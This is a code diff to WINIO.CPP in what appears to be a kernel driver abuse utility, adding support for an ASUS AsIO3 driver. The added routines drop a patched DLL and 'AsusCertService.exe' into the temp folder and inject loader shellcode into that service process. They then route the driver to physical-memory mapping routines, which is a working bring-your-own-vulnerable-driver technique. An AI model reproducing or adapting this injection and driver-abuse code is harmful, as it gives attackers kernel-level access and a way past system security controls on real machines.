@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2021
+*  (C) COPYRIGHT AUTHORS, 2020 - 2022
 *
 *  TITLE:       WINIO.CPP
 *
-*  VERSION:     1.11
+*  VERSION:     1.20
 *
-*  DATE:        19 Apr 2021
+*  DATE:        10 Feb 2022
 *
 *  WINIO based drivers routines.
 *
@@ -19,6 +19,7 @@
 
 #include "global.h"
 #include "idrv/winio.h"
+#include "ldrsc.h"
 
 #ifdef __cplusplus
 extern "C" {
@@ -616,6 +617,160 @@ BOOL WINAPI WinIoPreOpen(
     return supManageDummyDll(DUMMYDLL, FALSE);
 }
 
+#define ASUS_LDR_DLL L"u.dll"
+#define ASUS_SVC_EXE L"AsusCertService.exe"
+
+/*
+* AsusIO3PreOpen
+*
+* Purpose:
+*
+* Pre-open callback for AsIO3.
+*
+*/
+BOOL WINAPI AsusIO3PreOpen(
+    _In_ PVOID Param
+)
+{
+    BOOL bResult = FALSE;
+    DWORD cch;
+    ULONG resourceSize = 0;
+    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;
+    WCHAR szTemp[MAX_PATH + 1];
+    WCHAR szFileName[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
+    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
+    if (cch == 0 || cch > MAX_PATH) {
+        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+        return FALSE;
+    }
+
+    PBYTE dllBuffer, svcBuffer = NULL;
+
+    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI32,
+        GetModuleHandle(NULL),
+        &resourceSize,
+        PROVIDER_RES_KEY,
+        TRUE);
+
+    if (dllBuffer == NULL) {
+
+        supPrintfEvent(kduEventError,
+            "[!] Requested data id cannot be found %lu\r\n", IDR_TAIGEI32);
+
+        return FALSE;
+
+    }
+
+    if (supReplaceDllEntryPoint(dllBuffer,
+        resourceSize,
+        (LPCSTR)"RegisterForProvider",
+        FALSE))
+    {
+
+        StringCchPrintf(szFileName, MAX_PATH * 2,
+            TEXT("%ws\\%ws"),
+            szTemp,
+            ASUS_LDR_DLL);
+
+        if (supWriteBufferToFile(szFileName,
+            dllBuffer,
+            resourceSize,
+            TRUE,
+            FALSE,
+            NULL))
+        {
+            resourceSize = 0;
+            svcBuffer = (PBYTE)KDULoadResource(IDR_DATA_ASUSCERTSERVICE,
+                Context->ModuleBase,
+                &resourceSize,
+                PROVIDER_RES_KEY,
+                TRUE);
+
+            if (svcBuffer) {
+
+                StringCchPrintf(szFileName, MAX_PATH * 2,
+                    TEXT("%ws\\%ws"),
+                    szTemp,
+                    ASUS_SVC_EXE);
+
+                if (supWriteBufferToFile(szFileName,
+                    svcBuffer,
+                    resourceSize,
+                    TRUE,
+                    FALSE,
+                    NULL))
+                {
+                    HANDLE zombieProcess = NULL;
+
+                    if (NT_SUCCESS(supInjectPayload(svcBuffer,
+                        g_KduLoaderShellcode,
+                        sizeof(g_KduLoaderShellcode),
+                        szFileName,
+                        &zombieProcess)))
+                    {
+                        Sleep(1000);
+                        Context->ArbitraryData = (ULONG64)zombieProcess;
+                        bResult = TRUE;
+                    }
+                }
+
+                supHeapFree(svcBuffer);
+            }
+
+        }
+
+    }
+
+    supHeapFree(dllBuffer);
+
+    return bResult;
+}
+
+/*
+* AsusIO3UnregisterDriver
+*
+* Purpose:
+*
+* Unregister routine for AsIO3.
+*
+*/
+BOOL WINAPI AsusIO3UnregisterDriver(
+    _In_ HANDLE DeviceHandle,
+    _In_opt_ PVOID Param)
+{
+    DWORD cch;
+    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;
+
+    HANDLE zombieProcess;
+    WCHAR szTemp[MAX_PATH + 1];
+
+    UNREFERENCED_PARAMETER(DeviceHandle);
+
+    if (Context == NULL)
+        return FALSE;
+
+    zombieProcess = (HANDLE)Context->ArbitraryData;
+
+    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
+    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
+    if (cch == 0 || cch > MAX_PATH) {
+        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+        return FALSE;
+    }
+
+    if (zombieProcess) {
+        TerminateProcess(zombieProcess, ERROR_SUCCESS);
+        CloseHandle(zombieProcess);
+    }
+
+    supExtractFileToTemp(NULL, 0, szTemp, ASUS_SVC_EXE, TRUE);
+    supExtractFileToTemp(NULL, 0, szTemp, ASUS_LDR_DLL, TRUE);
+
+    return TRUE;
+}
+
 /*
 * WinIoRegisterDriver
 *
@@ -665,6 +820,7 @@ BOOL WINAPI WinIoRegisterDriver(
         break;
 
     case IDR_ASUSIO2:
+    case IDR_ASUSIO3:
         g_WinIoMapMemoryRoutine = WinIoMapMemory;
         g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
         g_PhysAddress64bit = TRUE;
